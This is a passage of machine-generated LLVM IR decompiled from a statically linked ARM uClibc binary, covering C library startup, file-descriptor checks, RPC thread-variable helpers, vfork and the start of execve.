  %v0_1445c = call i32 @__errno_location()
  store i32 %v2_143e0, i32* %r1.global-to-local, align 4
  store i32 %v0_1445c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_14470 = inttoptr i32 %v0_1445c to i32*
  %v2_14470 = load i32, i32* %v1_14470, align 4
  store i32 %v2_14470, i32* @r4, align 4
  %v3_14474 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_14474 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_14474, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1447c = load i32, i32* @r4, align 4
  %v1_1447c = load i32, i32* %r5.global-to-local, align 4
  %v2_1447c = inttoptr i32 %v1_1447c to i32*
  store i32 %v0_1447c, i32* %v2_1447c, align 4
  %v17_14528.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14524

dec_label_pc_14484:                               ; preds = %dec_label_pc_14444
  %v2_14484 = load i32, i32* %stack_var_-424, align 4
  %v7_14488 = icmp eq i32 %v2_14484, 1
  %v2_14490 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_14490, i32* @r4, align 4
  br i1 %v7_14488, label %dec_label_pc_14498, label %dec_label_pc_144cc

dec_label_pc_14498:                               ; preds = %dec_label_pc_14484
  store i32 %v2_14490, i32* @r1, align 4
  store i32 %v2_14490, i32* @r0, align 4
  %v0_144a0 = call i32 @nanosleep()
  store i32 %v0_144a0, i32* %r0.global-to-local, align 4
  store i32 %v0_144a0, i32* %r6.global-to-local, align 4
  %v0_144a8 = call i32 @__errno_location()
  store i32 %v2_143e0, i32* %r1.global-to-local, align 4
  store i32 %v0_144a8, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_144bc = inttoptr i32 %v0_144a8 to i32*
  %v2_144bc = load i32, i32* %v1_144bc, align 4
  store i32 %v2_144bc, i32* @r4, align 4
  %v3_144c0 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_144c0 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_144c0, i32 0)
  store i32 %v4_144c0, i32* %r0.global-to-local, align 4
  %v0_144c4 = load i32, i32* @r4, align 4
  %v1_144c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_144c4 = inttoptr i32 %v1_144c4 to i32*
  store i32 %v0_144c4, i32* %v2_144c4, align 4
  %v0_144f4.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_144f4

dec_label_pc_144cc:                               ; preds = %dec_label_pc_14484
  store i32 %v2_143e0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_144d8 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_144d8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_144d8, i32 0)
  store i32 %v4_144d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_144e8

dec_label_pc_144e8:                               ; preds = %dec_label_pc_143fc.dec_label_pc_144e8_crit_edge, %dec_label_pc_144cc
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_143fc.dec_label_pc_144e8_crit_edge ], [ %v2_14490, %dec_label_pc_144cc ]
  store i32 %storemerge.pre-phi, i32* @r0, align 4
  store i32 %storemerge.pre-phi, i32* @r1, align 4
  %v0_144ec = call i32 @nanosleep()
  store i32 %v0_144ec, i32* %r0.global-to-local, align 4
  store i32 %v0_144ec, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_144f4

dec_label_pc_144f4:                               ; preds = %dec_label_pc_14498, %dec_label_pc_144e8
  %v0_144f4 = phi i32 [ %v0_144f4.pr, %dec_label_pc_14498 ], [ %v0_144ec, %dec_label_pc_144e8 ]
  %v2_144f4 = icmp eq i32 %v0_144f4, 0
  br i1 %v2_144f4, label %dec_label_pc_14518, label %dec_label_pc_144fc

dec_label_pc_144fc:                               ; preds = %dec_label_pc_144f4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_14504 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_14504, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14524

dec_label_pc_14518:                               ; preds = %entry, %dec_label_pc_144f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14524

dec_label_pc_14520:                               ; preds = %dec_label_pc_143e0, %dec_label_pc_14430, %dec_label_pc_143bc
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14524

dec_label_pc_14524:                               ; preds = %dec_label_pc_144fc, %dec_label_pc_14518, %dec_label_pc_1445c, %dec_label_pc_14520
  %v17_14528 = phi i32 [ %v3_14504, %dec_label_pc_144fc ], [ 0, %dec_label_pc_14518 ], [ %v17_14528.pre, %dec_label_pc_1445c ], [ -1, %dec_label_pc_14520 ]
  %v2_14528 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14528, i32* @r4, align 4
  store i32 %v6_1438c, i32* @r5, align 4
  store i32 %v9_1438c, i32* @r6, align 4
  ret i32 %v17_14528

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 0 }
  uselistorder i32 %v1_14420, { 0, 2, 1 }
  uselistorder i32 %v1_143d8, { 1, 0, 2 }
  uselistorder i32 %v1_143ac, { 0, 2, 1 }
  uselistorder i32 %v16_1438c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 3, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 10, 11, 7, 9, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 8, 7, 9, 11, 12, 10, 14, 13, 15, 16, 18, 17, 19, 0 }
  uselistorder i32 ()* @nanosleep, { 2, 1, 3, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 9, 10, 11, 12, 5, 1, 3, 4, 13, 6, 7, 2, 8, 0 }
  uselistorder label %dec_label_pc_14524, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14520, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14518, { 1, 0 }
  uselistorder label %dec_label_pc_144f4, { 1, 0 }
  uselistorder label %dec_label_pc_144e8, { 1, 0 }
  uselistorder label %dec_label_pc_14418, { 1, 0 }
  uselistorder label %dec_label_pc_143a4, { 1, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_300bc.770 to i32)
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_14568:
  %stack_var_-8 = alloca i32, align 4
  %v3_1453c = load i32, i32* @r4, align 4
  store i32 %v3_1453c, i32* %stack_var_-8, align 4
  %v2_1456c = load i32, i32* @global_var_300cc.775, align 4
  %v2_14570 = icmp eq i32 %v2_1456c, 0
  br i1 %v2_14570, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14568
  call void @__pseudo_branch(i32 %v2_1456c)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14568, %bb
  %v2_14580 = load i32, i32* @global_var_300d0.777, align 4
  %v2_14584 = icmp eq i32 %v2_14580, 0
  br i1 %v2_14584, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_14588 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_14588, i32* @r4, align 4
  %v9_14588 = load i32, i32* @r0, align 4
  ret i32 %v9_14588

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_14580)
  %v2_14594 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14594, i32* @r4, align 4
  %v8_14594 = load i32, i32* @r0, align 4
  ret i32 %v8_14594

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_145b0 = load i32, i32* @r0, align 4
  ret i32 %v1_145b0
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_145b4 = load i32, i32* @r4, align 4
  store i32 %v3_145b4, i32* %stack_var_-12, align 4
  %v6_145b4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_145c4 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_145c8 = icmp eq i32 %v2_145c4, -1
  br i1 %v7_145c8, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_145cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_145cc, i32* @r4, align 4
  store i32 %v6_145b4, i32* @r5, align 4
  ret i32 %v2_145c4

bb4:                                              ; preds = %entry
  %v0_145d0 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1e28c.780 to i32), i32* @r0, align 4
  %v3_145d8 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1e28c.780 to i32), i32 %v0_145d0)
  %v1_145dc = load i32, i32* @r5, align 4
  %v9_145dc = icmp eq i32 %v3_145d8, %v1_145dc
  br i1 %v9_145dc, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_145e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_145e0, i32* @r4, align 4
  store i32 %v6_145b4, i32* @r5, align 4
  ret i32 %v3_145d8

bb6:                                              ; preds = %bb4
  %v0_145e4 = call i32 @abort()
  %v0_145e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_145e8, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_145e4

; uselistorder directives
  uselistorder i32 %v2_145c4, { 1, 0 }
  uselistorder i32 %v6_145b4, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @__libc_open, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_145f0 = load i32, i32* @global_var_300d4.782, align 4
  %v2_145f4 = icmp eq i32 %v2_145f0, 0
  br i1 %v2_145f4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v6_14600 = load i32, i32* @r0, align 4
  ret i32 %v6_14600

bb4:                                              ; preds = %entry
  store i32 1, i32* @global_var_300d4.782, align 4
  store i32 4096, i32* @global_var_300c8.241, align 4
  %v2_14620 = call i32 @__pthread_initialize_minimal()
  %v0_14634 = call i32 @_stdio_init()
  ret i32 %v0_14634
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_1464c = mul i32 %arg2, 4
  %v5_1464c = add i32 %tmp, %v4_1464c
  store i32 %v5_1464c, i32* @lr, align 4
  %v2_14650 = load i32, i32* %arg3, align 4
  %v2_14654 = ptrtoint i32* %stack_var_-120 to i32
  %v1_14658 = add i32 %v5_1464c, 4
  %v9_1465c = icmp eq i32 %v1_14658, %v2_14650
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_300c0.788, align 4
  store i32 %v1_14658, i32* @global_var_300c4.767, align 4
  store i32 %arg6, i32* @global_var_300d0.777, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_1465c, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_1464c, i32* @global_var_300c4.767, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %v2_14654, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %arg4, i32* @r7, align 4
  %v0_1469c = call i32 @__GI_memset()
  %storemerge.pre = load i32, i32* @global_var_300c4.767, align 4
  br label %dec_label_pc_146ac

dec_label_pc_146ac:                               ; preds = %dec_label_pc_146ac, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_146ac, %dec_label_pc_146ac ]
  %v1_146ac = inttoptr i32 %storemerge to i32*
  %v2_146ac = load i32, i32* %v1_146ac, align 4
  %v4_146ac = add i32 %storemerge, 4
  %v2_146b0 = icmp eq i32 %v2_146ac, 0
  br i1 %v2_146b0, label %dec_label_pc_146bc, label %dec_label_pc_146ac

dec_label_pc_146bc:                               ; preds = %dec_label_pc_146ac
  store i32 %v4_146ac, i32* @r4, align 4
  %v1_146dc22 = inttoptr i32 %v4_146ac to i32*
  %v2_146dc23 = load i32, i32* %v1_146dc22, align 4
  %v2_146e025 = icmp eq i32 %v2_146dc23, 0
  br i1 %v2_146e025, label %dec_label_pc_146e8, label %dec_label_pc_146c4

dec_label_pc_146c4:                               ; preds = %dec_label_pc_146bc, %dec_label_pc_146dc
  %v5_146c8 = phi i32 [ %v2_146dc, %dec_label_pc_146dc ], [ %v2_146dc23, %dec_label_pc_146bc ]
  %v2_146c4 = icmp ugt i32 %v5_146c8, 13
  %v7_146c4 = icmp eq i32 %v5_146c8, 14
  %v2_146c8 = xor i1 %v2_146c4, true
  %v3_146c8 = or i1 %v7_146c4, %v2_146c8
  br i1 %v3_146c8, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_146c4
  %v6_146c8 = and i32 %v5_146c8, 536870912
  %v7_146c8 = icmp ne i32 %v6_146c8, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_146c4, %bb42
  %v1_146d4 = phi i1 [ %v2_146c4, %dec_label_pc_146c4 ], [ %v7_146c8, %bb42 ]
  %v2_146cc = xor i1 %v1_146d4, true
  %v3_146cc = or i1 %v7_146c4, %v2_146cc
  br i1 %v3_146cc, label %bb44, label %dec_label_pc_146dc

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_146dc

dec_label_pc_146dc:                               ; preds = %bb43, %bb44
  store i32 83672, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_146cc, i32 ptrtoint ([3 x i8]* @global_var_12600.791 to i32))
  %v0_146d8 = load i32, i32* @r4, align 4
  %v1_146d8 = add i32 %v0_146d8, 8
  store i32 %v1_146d8, i32* @r4, align 4
  %v1_146dc = inttoptr i32 %v1_146d8 to i32*
  %v2_146dc = load i32, i32* %v1_146dc, align 4
  %v2_146e0 = icmp eq i32 %v2_146dc, 0
  br i1 %v2_146e0, label %dec_label_pc_146e8, label %dec_label_pc_146c4

dec_label_pc_146e8:                               ; preds = %dec_label_pc_146dc, %dec_label_pc_146bc
  %v1_146ec = call i32 @_dl_aux_init(i32 %v2_14654)
  store i32 %v1_146ec, i32* @r0, align 4
  %v1_146f0 = call i32 @__GI___uClibc_init(i32 %v1_146ec)
  store i32 %v1_146f0, i32* @r0, align 4
  %v2_146fc = icmp eq i32 %tmp37, 0
  br i1 %v2_146fc, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_146e8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_146e8, %bb45
  %v0_1470c = phi i32 [ %tmp37, %dec_label_pc_146e8 ], [ 4096, %bb45 ]
  %v3_14704 = icmp eq i32 %tmp36, -1
  %v8_14704 = icmp eq i32 %tmp36, -1
  store i32 %v0_1470c, i32* @global_var_300c8.241, align 4
  br i1 %v3_14704, label %dec_label_pc_14714, label %dec_label_pc_1473c

dec_label_pc_14714:                               ; preds = %bb46
  %v0_14714 = call i32 @getuid()
  store i32 %v0_14714, i32* @r0, align 4
  store i32 %v0_14714, i32* @r4, align 4
  %v0_1471c = call i32 @geteuid()
  %v0_14720 = load i32, i32* @r4, align 4
  %v9_14720 = icmp eq i32 %v0_14720, %v0_1471c
  br i1 %v9_14720, label %dec_label_pc_14728, label %dec_label_pc_14764

dec_label_pc_14728:                               ; preds = %dec_label_pc_14714
  %v1_14728 = call i32 @getgid(i32 %v0_1471c)
  store i32 %v1_14728, i32* @r0, align 4
  store i32 %v1_14728, i32* @r4, align 4
  %v0_14730 = call i32 @getegid()
  %v0_14734 = load i32, i32* @r4, align 4
  %v9_14734 = icmp eq i32 %v0_14734, %v0_14730
  br i1 %v9_14734, label %dec_label_pc_1473c, label %dec_label_pc_14764

dec_label_pc_1473c:                               ; preds = %dec_label_pc_14728, %bb46
  br i1 %v8_14704, label %dec_label_pc_147d0, label %dec_label_pc_14748

dec_label_pc_14748:                               ; preds = %dec_label_pc_1473c
  %v9_1474c = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_1474c, label %dec_label_pc_14754, label %dec_label_pc_14764

dec_label_pc_14754:                               ; preds = %dec_label_pc_14748
  br label %dec_label_pc_14764

dec_label_pc_14764:                               ; preds = %dec_label_pc_14754, %dec_label_pc_14748, %dec_label_pc_14728, %dec_label_pc_14714
  %v2_1476c = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_14778 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_14784 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_147d0

dec_label_pc_147d0:                               ; preds = %dec_label_pc_14764, %dec_label_pc_1473c
  %v0_14794 = load i32, i32* @r6, align 4
  %v1_14794 = inttoptr i32 %v0_14794 to i32*
  %v2_14794 = load i32, i32* %v1_14794, align 4
  store i32 %v2_14794, i32* @global_var_2b890, align 4
  store i32 %arg5, i32* @global_var_300cc.775, align 4
  %v2_147d0 = icmp eq i32 %arg4, 0
  br i1 %v2_147d0, label %dec_label_pc_1480c, label %bb47

bb47:                                             ; preds = %dec_label_pc_147d0
  br label %dec_label_pc_1480c

dec_label_pc_1480c:                               ; preds = %dec_label_pc_147d0, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_1481c = call i32 @__errno_location()
  %v2_14824 = inttoptr i32 %v1_1481c to i32*
  store i32 0, i32* %v2_14824, align 4
  %v1_14838 = call i32 @__h_errno_location()
  %v2_14840 = inttoptr i32 %v1_14838 to i32*
  store i32 0, i32* %v2_14840, align 4
  %v0_14850 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_1485c = call i32 @__GI_exit(i32 %v0_14850)
  ret i32 %v1_1485c

; uselistorder directives
  uselistorder i32 %v2_146dc, { 1, 0 }
  uselistorder i32 %v1_146d8, { 1, 0 }
  uselistorder i1 %v2_146c4, { 1, 0 }
  uselistorder i32 %v4_146ac, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 1, 0, 2 }
  uselistorder i32* @global_var_300c8.241, { 1, 0, 2, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1480c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_146dc, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_146c4, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @rpc_thread_multi() local_unnamed_addr {
bb:
  store i32 2, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_300dc.807 to i32), i32* @r1, align 4
  %v0_148b4 = call i32 @__pthread_internal_tsd_set()
  ret i32 %v0_148b4
}

define i32 @__rpc_thread_variables() local_unnamed_addr {
bb:
  %stack_var_-8 = alloca i32, align 4
  %v3_148c8 = load i32, i32* @r4, align 4
  store i32 %v3_148c8, i32* %stack_var_-8, align 4
  store i32 84196, i32* @lr, align 4
  call void @__pseudo_branch(i32 64000)
  br i1 false, label %.threadthread-pre-split, label %dec_label_pc_149a8

.threadthread-pre-split:                          ; preds = %bb
  br i1 false, label %dec_label_pc_1494c, label %dec_label_pc_149a8

dec_label_pc_1494c:                               ; preds = %.threadthread-pre-split
  br i1 undef, label %dec_label_pc_14988, label %dec_label_pc_14974

dec_label_pc_14974:                               ; preds = %dec_label_pc_1494c
  br label %dec_label_pc_149a8

dec_label_pc_14988:                               ; preds = %dec_label_pc_1494c
  br label %dec_label_pc_149a8

dec_label_pc_149a8:                               ; preds = %.threadthread-pre-split, %bb, %dec_label_pc_14974, %dec_label_pc_14988
  %v2_149ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_149ac, i32* @r4, align 4
  ret i32 2

; uselistorder directives
  uselistorder label %dec_label_pc_149a8, { 3, 2, 0, 1 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  %v0_149cc = call i32 @__rpc_thread_variables()
  %v9_149d8 = icmp eq i32 %v0_149cc, ptrtoint (i32* @global_var_300dc.807 to i32)
  br i1 %v9_149d8, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v2_149dc = add i32 %v0_149cc, 148
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_149e0 = phi i32 [ ptrtoint (i32* @global_var_302fc.821 to i32), %entry ], [ %v2_149dc, %bb ]
  ret i32 %v0_149e0

; uselistorder directives
  uselistorder i32 148, { 1, 2, 3, 11, 4, 6, 5, 7, 8, 9, 0, 10 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  %v0_149f4 = call i32 @__rpc_thread_variables()
  %v9_14a00 = icmp eq i32 %v0_149f4, ptrtoint (i32* @global_var_300dc.807 to i32)
  br i1 %v9_14a00, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v2_14a04 = add i32 %v0_149f4, 144
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v0_14a08 = phi i32 [ ptrtoint (i32* @global_var_30310.824 to i32), %entry ], [ %v2_14a04, %bb ]
  ret i32 %v0_14a08

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  %v0_14a1c = call i32 @__rpc_thread_variables()
  %v9_14a28 = icmp eq i32 %v0_14a1c, ptrtoint (i32* @global_var_300dc.807 to i32)
  br i1 %v9_14a28, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v2_14a2c = add i32 %v0_14a1c, 128
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_14a30 = phi i32 [ ptrtoint (i32* @global_var_30300.827 to i32), %entry ], [ %v2_14a2c, %bb ]
  ret i32 %v0_14a30

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_14a44 = call i32 @__rpc_thread_variables()
  %v9_14a50 = icmp eq i32 %v0_14a44, ptrtoint (i32* @global_var_300dc.807 to i32)
  br i1 %v9_14a50, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_14a58 = phi i32 [ %v0_14a44, %entry ], [ ptrtoint (i32* @global_var_30270.830 to i32), %bb ]
  ret i32 %v5_14a58

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
bb:
  %stack_var_-8 = alloca i32, align 4
  %v3_14a68 = load i32, i32* @r4, align 4
  store i32 %v3_14a68, i32* %stack_var_-8, align 4
  %v6_14a68 = load i32, i32* @lr, align 4
  store i32 84616, i32* @lr, align 4
  call void @__pseudo_branch(i32 64000)
  store i32 2, i32* @r4, align 4
  br i1 icmp eq (i32 ptrtoint (i32* @global_var_300dc.807 to i32), i32 2), label %bb3, label %bb4

bb3:                                              ; preds = %bb
  %v3_14a9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_14a9c, i32* @r4, align 4
  ret i32 2

bb4:                                              ; preds = %bb
  %v0_14aa0 = call i32 @__rpc_thread_svc_cleanup()
  %v1_14aa4 = call i32 @__rpc_thread_clnt_cleanup(i32 %v0_14aa0)
  %v0_14aa8 = load i32, i32* @r4, align 4
  %v1_14aa8 = add i32 %v0_14aa8, 152
  %v2_14aa8 = inttoptr i32 %v1_14aa8 to i32*
  %v3_14aa8 = load i32, i32* %v2_14aa8, align 4
  store i32 %v3_14aa8, i32* @r0, align 4
  %v0_14aac = call i32 @free()
  %v0_14ab0 = load i32, i32* @r4, align 4
  %v1_14ab0 = add i32 %v0_14ab0, 156
  %v2_14ab0 = inttoptr i32 %v1_14ab0 to i32*
  %v3_14ab0 = load i32, i32* %v2_14ab0, align 4
  store i32 %v3_14ab0, i32* @r0, align 4
  %v0_14ab4 = call i32 @free()
  %v0_14ab8 = load i32, i32* @r4, align 4
  %v1_14ab8 = add i32 %v0_14ab8, 160
  %v2_14ab8 = inttoptr i32 %v1_14ab8 to i32*
  %v3_14ab8 = load i32, i32* %v2_14ab8, align 4
  store i32 %v3_14ab8, i32* @r0, align 4
  %v0_14abc = call i32 @free()
  %v0_14ac0 = load i32, i32* @r4, align 4
  %v1_14ac0 = add i32 %v0_14ac0, 188
  %v2_14ac0 = inttoptr i32 %v1_14ac0 to i32*
  %v3_14ac0 = load i32, i32* %v2_14ac0, align 4
  store i32 %v3_14ac0, i32* @r0, align 4
  %v0_14ac4 = call i32 @free()
  %v0_14ac8 = load i32, i32* @r4, align 4
  %v1_14ac8 = add i32 %v0_14ac8, 172
  %v2_14ac8 = inttoptr i32 %v1_14ac8 to i32*
  %v3_14ac8 = load i32, i32* %v2_14ac8, align 4
  store i32 %v3_14ac8, i32* @r0, align 4
  %v0_14acc = call i32 @free()
  %v0_14ad0 = load i32, i32* @r4, align 4
  %v1_14ad0 = add i32 %v0_14ad0, 176
  %v2_14ad0 = inttoptr i32 %v1_14ad0 to i32*
  %v3_14ad0 = load i32, i32* %v2_14ad0, align 4
  store i32 %v3_14ad0, i32* @r0, align 4
  %v0_14ad4 = call i32 @free()
  %v0_14ad8 = load i32, i32* @r4, align 4
  store i32 %v0_14ad8, i32* @r0, align 4
  %v0_14adc = call i32 @free()
  store i32 0, i32* @r1, align 4
  store i32 2, i32* @r0, align 4
  %v3_14af8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_14af8, i32* @r4, align 4
  store i32 %v6_14a68, i32* @lr, align 4
  %v0_14b00 = call i32 @__pthread_internal_tsd_set()
  ret i32 %v0_14b00

; uselistorder directives
  uselistorder i32 172, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_300dc.807 to i32), { 0, 2, 3, 4, 5, 1 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_14b14 = load i32, i32* @r4, align 4
  store i32 %v3_14b14, i32* %stack_var_-8, align 4
  %v0_14b18 = load i32, i32* @r0, align 4
  %v0_14b1c = call i32 @__errno_location()
  %v1_14b20 = sub i32 0, %v0_14b18
  %v2_14b24 = inttoptr i32 %v0_14b1c to i32*
  store i32 %v1_14b20, i32* %v2_14b24, align 4
  %v2_14b2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b2c, i32* @r4, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1) local_unnamed_addr {
entry:
  %v0_14b34 = load i32, i32* @r1, align 4
  %v2_14b34 = icmp eq i32 %v0_14b34, 0
  br i1 %v2_14b34, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_14b40 = phi i32 [ %v0_14b34, %entry ], [ 1, %bb ]
  ret i32 %v1_14b40

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_14b50 = call i32 @fork()
  store i32 %v0_14b50, i32* @r0, align 4
  %v2_14b54 = icmp ugt i32 %v0_14b50, -4097
  br i1 %v2_14b54, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_14b68, %entry
  %merge = phi i32 [ %v0_14b50, %entry ], [ %v0_14b68, %dec_label_pc_14b68 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_14b60 = icmp eq i32 %v0_14b50, -38
  br i1 %v4_14b60, label %dec_label_pc_14b68, label %bb2

dec_label_pc_14b68:                               ; preds = %bb1
  %v0_14b68 = call i32 @fork()
  store i32 %v0_14b68, i32* @r0, align 4
  %v2_14b6c = icmp ugt i32 %v0_14b68, -4097
  br i1 %v2_14b6c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_14b68
  %v0_14b74 = call i32 @__syscall_error()
  ret i32 %v0_14b74

; uselistorder directives
  uselistorder i32 %v0_14b68, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 1, 0 }
  uselistorder i32 ()* @fork, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b80 = load i32, i32* @r4, align 4
  store i32 %v3_14b80, i32* %stack_var_-8, align 4
  %v0_14b84 = load i32, i32* @r0, align 4
  %v1_14b84 = inttoptr i32 %v0_14b84 to i8*
